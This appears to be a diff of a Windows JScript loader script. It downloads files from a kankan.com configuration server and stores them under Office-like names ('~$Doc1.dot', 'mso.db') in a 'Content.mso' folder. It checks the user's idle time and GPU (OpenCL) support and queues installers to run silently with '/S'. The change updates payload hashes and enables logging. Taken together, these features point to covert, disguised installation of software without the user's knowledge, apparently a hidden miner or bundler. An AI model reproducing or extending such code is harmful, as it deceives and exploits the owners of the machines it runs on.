@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"4908BB66F457F1452E9CA6543113CBF2" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"8981A23C772567B51DE210A60B424F91" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -35,7 +35,7 @@ if(__DEBUG)
 	var __idletime=1000*15
 else if(__IsSupportOpencl)
 	var __idletime=1000*30
-var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"267B575DC6493B921333F5785DC236CE" }
+var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"305373AE97A5DD2CBB123F45BA664AAA" }
 var __installReadys = [
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
 							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
@@ -50,8 +50,8 @@ trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot")
 		)
 //
 function log(msg){
-	if(!__DEBUG)
-		return ;
+	//if(!__DEBUG)
+		//return ;
 	var er = log.caller
 	var debugstring=""
 	var funname=""
